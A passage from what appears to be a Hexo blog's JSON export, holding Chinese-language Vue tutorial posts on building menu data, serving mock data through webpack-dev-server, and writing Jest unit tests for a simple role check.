class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (element.name &amp;&amp; !element.hideInMenu) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.openKeysMap[element.path] = parentKeys;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.selectedKeysMap[element.path] = [selectedKey || element.path];</span><br><span class=\"line\">      <span class=\"keyword\">const</span> newItem = &#123; ...element &#125;;</span><br><span class=\"line\">      <span class=\"keyword\">delete</span> newItem.children;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (element.children &amp;&amp; !element.hideChildrenInMenu) &#123;</span><br><span class=\"line\">        newItem.children = <span class=\"keyword\">this</span>.getMenuData(element.children, [</span><br><span class=\"line\">          ...parentKeys,</span><br><span class=\"line\">          element.path</span><br><span class=\"line\">        ]);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.getMenuData(</span><br><span class=\"line\">          element.children,</span><br><span class=\"line\">          selectedKey ? parentKeys : [...parentKeys, element.path],</span><br><span class=\"line\">          selectedKey || element.path</span><br><span class=\"line\">        );</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      menuData.push(newItem);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (</span><br><span class=\"line\">      !element.hideInMenu &amp;&amp;</span><br><span class=\"line\">      !element.hideChildrenInMenu &amp;&amp;</span><br><span class=\"line\">      element.children</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">      menuData.push(</span><br><span class=\"line\">        ...this.getMenuData(element.children, [...parentKeys, element.path])</span><br><span class=\"line\">      );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> menuData;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@使用mock数据","date":"2019-05-22T11:35:06.000Z","updated":"2019-05-22T11:35:06.000Z","_content":"\n# 概述\n\n在开发中使用 mock 数据有好多种方式，大点公司自己搭建接口平台系统，其他的可以使用 Easy Mock、Mock.js 等。在 webpack 工程项目下可以利用 webpack-dev-server 搭建一个简单快速灵活的 mock 服务。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 创建 mock 数据文件\n\n项目根目录创建 mock 文件夹来存放 mock 数据文件，然后根据业务创建对应的 mock 文件，例如 dashboard_chart.js，内容如下：\n\n```js\nfunction chart(method) {\n  let res = null;\n  switch (method) {\n    case \"GET\":\n      res = [120, 30, 40, 60, 20, 45];\n      break;\n\n    default:\n      res = null;\n      break;\n  }\n  return res;\n}\n// 因为node端使用，因此用CMD规范，而不是ES6\nmodule.exports = chart;\n```\n\n## 配置 webpack-dev-server\n\n本示例是 vue-cli 创建的项目，对应的就是在 vue.config.js 中配置 devServer，示例如下：\n\n```js\nmodule.exports = {\n  devServer: {\n    port: 3000,\n    proxy: {\n      \"/api\": {\n        target: \"http://localhost:3000\",\n        bypass: function(req, res) {\n          if (req.headers.accept.indexOf(\"html\") !== -1) {\n            console.log(\"Skipping proxy for browser request.\");\n            return \"/index.html\";\n          } else if (process.env.MOCK !== \"none\") {\n            //根据环境变量\n            const name = req.path\n              .split(\"/api/\")[1]\n              .split(\"/\")\n              .join(\"_\");\n            const chart = require(`./mock/${name}`);\n            const result = chart(req.method);\n            delete require.cache[require.resolve(`./mock/${name}`)];\n            return res.send(result);\n          }\n        }\n      }\n    }\n  }\n};\n```\n\n## 数据请求\n\n具体业务组件中的使用，axios 使用为例，如下：\n\n```js\ngetChartData() {\n  axios\n    .get(\"/api/dashboard/chart\", { params: { ID: 12345 } })\n    .then(response => {\n      this.chartOption = {\n        title: {\n          text: \"ECharts 入门示例\"\n        },\n        tooltip: {},\n        xAxis: {\n          data: [\"衬衫\", \"羊毛衫\", \"雪纺衫\", \"裤子\", \"高跟鞋\", \"袜子\"]\n        },\n        yAxis: {},\n        series: [\n          {\n            name: \"销量\",\n            type: \"bar\",\n            data: response.data //请求的数据\n          }\n        ]\n      };\n    });\n}\n```\n\n## 多环境判断\n\n实际中，会面对多个环境，除了开发环境，还有测试环境，生产环境等。那么对于数据接口的调用也将是根据环境来区分。\n\n本次示例：\n安装 cross-env 实现跨平台，在 package.json 配置执行命令`\"serve:no-mock\": \"cross-env MOCK=none vue-cli-service serve\"`，然后在请求是判断是否用 mock 数据，示例如上。\n\n# 参考\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-mock.md","raw":"---\ntitle: Vue实战@使用mock数据\npermalink: vue-in-action-mock\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-22 19:35:06\nupdated: 2019-05-22 19:35:06\n---\n\n# 概述\n\n在开发中使用 mock 数据有好多种方式，大点公司自己搭建接口平台系统，其他的可以使用 Easy Mock、Mock.js 等。在 webpack 工程项目下可以利用 webpack-dev-server 搭建一个简单快速灵活的 mock 服务。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 创建 mock 数据文件\n\n项目根目录创建 mock 文件夹来存放 mock 数据文件，然后根据业务创建对应的 mock 文件，例如 dashboard_chart.js，内容如下：\n\n```js\nfunction chart(method) {\n  let res = null;\n  switch (method) {\n    case \"GET\":\n      res = [120, 30, 40, 60, 20, 45];\n      break;\n\n    default:\n      res = null;\n      break;\n  }\n  return res;\n}\n// 因为node端使用，因此用CMD规范，而不是ES6\nmodule.exports = chart;\n```\n\n## 配置 webpack-dev-server\n\n本示例是 vue-cli 创建的项目，对应的就是在 vue.config.js 中配置 devServer，示例如下：\n\n```js\nmodule.exports = {\n  devServer: {\n    port: 3000,\n    proxy: {\n      \"/api\": {\n        target: \"http://localhost:3000\",\n        bypass: function(req, res) {\n          if (req.headers.accept.indexOf(\"html\") !== -1) {\n            console.log(\"Skipping proxy for browser request.\");\n            return \"/index.html\";\n          } else if (process.env.MOCK !== \"none\") {\n            //根据环境变量\n            const name = req.path\n              .split(\"/api/\")[1]\n              .split(\"/\")\n              .join(\"_\");\n            const chart = require(`./mock/${name}`);\n            const result = chart(req.method);\n            delete require.cache[require.resolve(`./mock/${name}`)];\n            return res.send(result);\n          }\n        }\n      }\n    }\n  }\n};\n```\n\n## 数据请求\n\n具体业务组件中的使用，axios 使用为例，如下：\n\n```js\ngetChartData() {\n  axios\n    .get(\"/api/dashboard/chart\", { params: { ID: 12345 } })\n    .then(response => {\n      this.chartOption = {\n        title: {\n          text: \"ECharts 入门示例\"\n        },\n        tooltip: {},\n        xAxis: {\n          data: [\"衬衫\", \"羊毛衫\", \"雪纺衫\", \"裤子\", \"高跟鞋\", \"袜子\"]\n        },\n        yAxis: {},\n        series: [\n          {\n            name: \"销量\",\n            type: \"bar\",\n            data: response.data //请求的数据\n          }\n        ]\n      };\n    });\n}\n```\n\n## 多环境判断\n\n实际中，会面对多个环境，除了开发环境，还有测试环境，生产环境等。那么对于数据接口的调用也将是根据环境来区分。\n\n本次示例：\n安装 cross-env 实现跨平台，在 package.json 配置执行命令`\"serve:no-mock\": \"cross-env MOCK=none vue-cli-service serve\"`，然后在请求是判断是否用 mock 数据，示例如上。\n\n# 参考\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-mock","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xt0072wovv2dq0exol","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>在开发中使用 mock 数据有好多种方式，大点公司自己搭建接口平台系统，其他的可以使用 Easy Mock、Mock.js 等。在 webpack 工程项目下可以利用 webpack-dev-server 搭建一个简单快速灵活的 mock 服务。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"创建-mock-数据文件\"><a href=\"#创建-mock-数据文件\" class=\"headerlink\" title=\"创建 mock 数据文件\"></a>创建 mock 数据文件</h2><p>项目根目录创建 mock 文件夹来存放 mock 数据文件，然后根据业务创建对应的 mock 文件，例如 dashboard_chart.js，内容如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">chart</span>(<span class=\"params\">method</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (method) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">\"GET\"</span>:</span><br><span class=\"line\">      res = [<span class=\"number\">120</span>, <span class=\"number\">30</span>, <span class=\"number\">40</span>, <span class=\"number\">60</span>, <span class=\"number\">20</span>, <span class=\"number\">45</span>];</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      res = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 因为node端使用，因此用CMD规范，而不是ES6</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = chart;</span><br></pre></td></tr></table></figure>\n<h2 id=\"配置-webpack-dev-server\"><a href=\"#配置-webpack-dev-server\" class=\"headerlink\" title=\"配置 webpack-dev-server\"></a>配置 webpack-dev-server</h2><p>本示例是 vue-cli 创建的项目，对应的就是在 vue.config.js 中配置 devServer，示例如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  devServer: &#123;</span><br><span class=\"line\">    port: <span class=\"number\">3000</span>,</span><br><span class=\"line\">    proxy: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"/api\"</span>: &#123;</span><br><span class=\"line\">        target: <span class=\"string\">\"http://localhost:3000\"</span>,</span><br><span class=\"line\">        bypass: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (req.headers.accept.indexOf(<span class=\"string\">\"html\"</span>) !== <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Skipping proxy for browser request.\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"/index.html\"</span>;</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (process.env.MOCK !== <span class=\"string\">\"none\"</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//根据环境变量</span></span><br><span class=\"line\">            <span class=\"keyword\">const</span> name = req.path</span><br><span class=\"line\">              .split(<span class=\"string\">\"/api/\"</span>)[<span class=\"number\">1</span>]</span><br><span class=\"line\">              .split(<span class=\"string\">\"/\"</span>)</span><br><span class=\"line\">              .join(<span class=\"string\">\"_\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">const</span> chart = <span class=\"built_in\">require</span>(<span class=\"string\">`./mock/<span class=\"subst\">$&#123;name&#125;</span>`</span>);</span><br><span class=\"line\">            <span class=\"keyword\">const</span> result = chart(req.method);</span><br><span class=\"line\">            <span class=\"keyword\">delete</span> <span class=\"built_in\">require</span>.cache[<span class=\"built_in\">require</span>.resolve(<span class=\"string\">`./mock/<span class=\"subst\">$&#123;name&#125;</span>`</span>)];</span><br><span class=\"line\">            <span class=\"keyword\">return</span> res.send(result);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"数据请求\"><a href=\"#数据请求\" class=\"headerlink\" title=\"数据请求\"></a>数据请求</h2><p>具体业务组件中的使用，axios 使用为例，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getChartData() &#123;</span><br><span class=\"line\">  axios</span><br><span class=\"line\">    .get(<span class=\"string\">\"/api/dashboard/chart\"</span>, &#123; <span class=\"attr\">params</span>: &#123; <span class=\"attr\">ID</span>: <span class=\"number\">12345</span> &#125; &#125;)</span><br><span class=\"line\">    .then(<span class=\"function\"><span class=\"params\">response</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chartOption = &#123;</span><br><span class=\"line\">        title: &#123;</span><br><span class=\"line\">          text: <span class=\"string\">\"ECharts 入门示例\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        tooltip: &#123;&#125;,</span><br><span class=\"line\">        xAxis: &#123;</span><br><span class=\"line\">          data: [<span class=\"string\">\"衬衫\"</span>, <span class=\"string\">\"羊毛衫\"</span>, <span class=\"string\">\"雪纺衫\"</span>, <span class=\"string\">\"裤子\"</span>, <span class=\"string\">\"高跟鞋\"</span>, <span class=\"string\">\"袜子\"</span>]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        yAxis: &#123;&#125;,</span><br><span class=\"line\">        series: [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            name: <span class=\"string\">\"销量\"</span>,</span><br><span class=\"line\">            type: <span class=\"string\">\"bar\"</span>,</span><br><span class=\"line\">            data: response.data <span class=\"comment\">//请求的数据</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"多环境判断\"><a href=\"#多环境判断\" class=\"headerlink\" title=\"多环境判断\"></a>多环境判断</h2><p>实际中，会面对多个环境，除了开发环境，还有测试环境，生产环境等。那么对于数据接口的调用也将是根据环境来区分。</p>\n<p>本次示例：<br>安装 cross-env 实现跨平台，在 package.json 配置执行命令<code>&quot;serve:no-mock&quot;: &quot;cross-env MOCK=none vue-cli-service serve&quot;</code>，然后在请求是判断是否用 mock 数据，示例如上。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>在开发中使用 mock 数据有好多种方式，大点公司自己搭建接口平台系统，其他的可以使用 Easy Mock、Mock.js 等。在 webpack 工程项目下可以利用 webpack-dev-server 搭建一个简单快速灵活的 mock 服务。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"创建-mock-数据文件\"><a href=\"#创建-mock-数据文件\" class=\"headerlink\" title=\"创建 mock 数据文件\"></a>创建 mock 数据文件</h2><p>项目根目录创建 mock 文件夹来存放 mock 数据文件，然后根据业务创建对应的 mock 文件，例如 dashboard_chart.js，内容如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">chart</span>(<span class=\"params\">method</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (method) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">\"GET\"</span>:</span><br><span class=\"line\">      res = [<span class=\"number\">120</span>, <span class=\"number\">30</span>, <span class=\"number\">40</span>, <span class=\"number\">60</span>, <span class=\"number\">20</span>, <span class=\"number\">45</span>];</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      res = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 因为node端使用，因此用CMD规范，而不是ES6</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = chart;</span><br></pre></td></tr></table></figure>\n<h2 id=\"配置-webpack-dev-server\"><a href=\"#配置-webpack-dev-server\" class=\"headerlink\" title=\"配置 webpack-dev-server\"></a>配置 webpack-dev-server</h2><p>本示例是 vue-cli 创建的项目，对应的就是在 vue.config.js 中配置 devServer，示例如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  devServer: &#123;</span><br><span class=\"line\">    port: <span class=\"number\">3000</span>,</span><br><span class=\"line\">    proxy: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"/api\"</span>: &#123;</span><br><span class=\"line\">        target: <span class=\"string\">\"http://localhost:3000\"</span>,</span><br><span class=\"line\">        bypass: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (req.headers.accept.indexOf(<span class=\"string\">\"html\"</span>) !== <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Skipping proxy for browser request.\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"/index.html\"</span>;</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (process.env.MOCK !== <span class=\"string\">\"none\"</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//根据环境变量</span></span><br><span class=\"line\">            <span class=\"keyword\">const</span> name = req.path</span><br><span class=\"line\">              .split(<span class=\"string\">\"/api/\"</span>)[<span class=\"number\">1</span>]</span><br><span class=\"line\">              .split(<span class=\"string\">\"/\"</span>)</span><br><span class=\"line\">              .join(<span class=\"string\">\"_\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">const</span> chart = <span class=\"built_in\">require</span>(<span class=\"string\">`./mock/<span class=\"subst\">$&#123;name&#125;</span>`</span>);</span><br><span class=\"line\">            <span class=\"keyword\">const</span> result = chart(req.method);</span><br><span class=\"line\">            <span class=\"keyword\">delete</span> <span class=\"built_in\">require</span>.cache[<span class=\"built_in\">require</span>.resolve(<span class=\"string\">`./mock/<span class=\"subst\">$&#123;name&#125;</span>`</span>)];</span><br><span class=\"line\">            <span class=\"keyword\">return</span> res.send(result);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"数据请求\"><a href=\"#数据请求\" class=\"headerlink\" title=\"数据请求\"></a>数据请求</h2><p>具体业务组件中的使用，axios 使用为例，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getChartData() &#123;</span><br><span class=\"line\">  axios</span><br><span class=\"line\">    .get(<span class=\"string\">\"/api/dashboard/chart\"</span>, &#123; <span class=\"attr\">params</span>: &#123; <span class=\"attr\">ID</span>: <span class=\"number\">12345</span> &#125; &#125;)</span><br><span class=\"line\">    .then(<span class=\"function\"><span class=\"params\">response</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chartOption = &#123;</span><br><span class=\"line\">        title: &#123;</span><br><span class=\"line\">          text: <span class=\"string\">\"ECharts 入门示例\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        tooltip: &#123;&#125;,</span><br><span class=\"line\">        xAxis: &#123;</span><br><span class=\"line\">          data: [<span class=\"string\">\"衬衫\"</span>, <span class=\"string\">\"羊毛衫\"</span>, <span class=\"string\">\"雪纺衫\"</span>, <span class=\"string\">\"裤子\"</span>, <span class=\"string\">\"高跟鞋\"</span>, <span class=\"string\">\"袜子\"</span>]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        yAxis: &#123;&#125;,</span><br><span class=\"line\">        series: [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            name: <span class=\"string\">\"销量\"</span>,</span><br><span class=\"line\">            type: <span class=\"string\">\"bar\"</span>,</span><br><span class=\"line\">            data: response.data <span class=\"comment\">//请求的数据</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"多环境判断\"><a href=\"#多环境判断\" class=\"headerlink\" title=\"多环境判断\"></a>多环境判断</h2><p>实际中，会面对多个环境，除了开发环境，还有测试环境，生产环境等。那么对于数据接口的调用也将是根据环境来区分。</p>\n<p>本次示例：<br>安装 cross-env 实现跨平台，在 package.json 配置执行命令<code>&quot;serve:no-mock&quot;: &quot;cross-env MOCK=none vue-cli-service serve&quot;</code>，然后在请求是判断是否用 mock 数据，示例如上。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@单元测试","date":"2019-05-30T00:55:08.000Z","updated":"2019-05-30T00:55:08.000Z","_content":"\n# 概述\n\n单元测试在日常开发中可能使用率不高，但是对于功能性的模块，开源的项目就显得非常必要了。Vue CLI 拥有开箱即用的通过 Jest 或 Mocha 进行单元测试的内置选项。本次我们在用 cli 建项目的时候选择了 Jest 方式，因此本文说下在 Vue CLI 构建的项目中 Jest 的使用。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 待测代码\n\n```js\n// src/auth.js\nconst currentAuth = [\"admin\"];\nexport { currentAuth };\n\nexport function getCurrentAuthority() {\n  return currentAuth;\n}\n\nexport function check(authority) {\n  const current = getCurrentAuthority();\n  return current.some(item => authority.includes(item));\n}\n\nexport function isLogin() {\n  const current = getCurrentAuthority();\n  return current && current[0] !== \"guest\";\n}\n```\n\n## 执行单测命令\n\n```shell\nnpm run test:unit -- --watch\n```\n\n## 编写单测脚本\n\n在 tests/unit 下新建文件 auth.spec.js，然后编写脚本，简单的可以参考 example.spec.js 代码，详细的看 Jest[官方文档](https://jestjs.io/docs/en/getting-started)。本次示例代码：\n\n```js\nimport { check, currentAuth } from \"../../src/utils/auth\";\n\n// auth测试组\ndescribe(\"auth test\", () => {\n  it(\"empty auth\", () => {\n    // 清空currentAuth\n    currentAuth.splice(0, currentAuth.length);\n    expect(check([\"user\"])).toBeFalsy();\n    expect(check([\"admin\"])).toBeFalsy();\n  });\n\n  it(\"user auth\", () => {\n    // 清空currentAuth\n    currentAuth.splice(0, currentAuth.length);\n    currentAuth.push(\"user\");\n    expect(check([\"user\"])).toBeTruthy();\n    expect(check([\"admin\"])).toBeFalsy();\n  });\n\n  it(\"admin auth\", () => {\n    // 继续添加admin角色\n    currentAuth.push(\"admin\");\n    expect(check([\"user\"])).toBeTruthy();\n    expect(check([\"admin\"])).toBeTruthy();\n    expect(check([\"user\", \"admin\"])).toBeTruthy();\n  });\n});\n```","source":"_posts/2019/05/vue-in-action-unitTest.md","raw":"---\ntitle: Vue实战@单元测试\npermalink: vue-in-action-unitTest\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-30 08:55:08\nupdated: 2019-05-30 08:55:08\n---\n\n# 概述\n\n单元测试在日常开发中可能使用率不高，但是对于功能性的模块，开源的项目就显得非常必要了。Vue CLI 拥有开箱即用的通过 Jest 或 Mocha 进行单元测试的内置选项。本次我们在用 cli 建项目的时候选择了 Jest 方式，因此本文说下在 Vue CLI 构建的项目中 Jest 的使用。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 待测代码\n\n```js\n// src/auth.js\nconst currentAuth = [\"admin\"];\nexport { currentAuth };\n\nexport function getCurrentAuthority() {\n  return currentAuth;\n}\n\nexport function check(authority) {\n  const current = getCurrentAuthority();\n  return current.some(item => authority.includes(item));\n}\n\nexport function isLogin() {\n  const current = getCurrentAuthority();\n  return current && current[0] !== \"guest\";\n}\n```\n\n## 执行单测命令\n\n```shell\nnpm run test:unit -- --watch\n```\n\n## 编写单测脚本\n\n在 tests/unit 下新建文件 auth.spec.js，然后编写脚本，简单的可以参考 example.spec.js 代码，详细的看 Jest[官方文档](https://jestjs.io/docs/en/getting-started)。本次示例代码：\n\n```js\nimport { check, currentAuth } from \"../../src/utils/auth\";\n\n// auth测试组\ndescribe(\"auth test\", () => {\n  it(\"empty auth\", () => {\n    // 清空currentAuth\n    currentAuth.splice(0, currentAuth.length);\n    expect(check([\"user\"])).toBeFalsy();\n    expect(check([\"admin\"])).toBeFalsy();\n  });\n\n  it(\"user auth\", () => {\n    // 清空currentAuth\n    currentAuth.splice(0, currentAuth.length);\n    currentAuth.push(\"user\");\n    expect(check([\"user\"])).toBeTruthy();\n    expect(check([\"admin\"])).toBeFalsy();\n  });\n\n  it(\"admin auth\", () => {\n    // 继续添加admin角色\n    currentAuth.push(\"admin\");\n    expect(check([\"user\"])).toBeTruthy();\n    expect(check([\"admin\"])).toBeTruthy();\n    expect(check([\"user\", \"admin\"])).toBeTruthy();\n  